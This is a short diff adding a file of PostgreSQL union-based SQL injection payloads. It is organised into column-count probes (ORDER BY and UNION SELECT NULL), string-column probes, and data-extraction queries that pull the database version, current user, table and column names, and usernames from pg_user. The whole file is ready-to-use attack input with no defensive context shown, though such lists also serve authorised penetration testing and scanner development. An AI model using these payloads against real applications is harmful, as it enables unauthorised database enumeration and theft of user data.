@@ -1,0 +1,22 @@
+# PostgreSQL — Union-Based Payloads
+
+# --- Column count ---
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+# --- String column probe ---
+' UNION SELECT 'a'--
+' UNION SELECT 'a',NULL--
+
+# --- Data extraction ---
+' UNION SELECT version()--
+' UNION SELECT current_database()--
+' UNION SELECT current_user--
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1--
+' UNION SELECT usename FROM pg_user LIMIT 1--
+' UNION SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'--
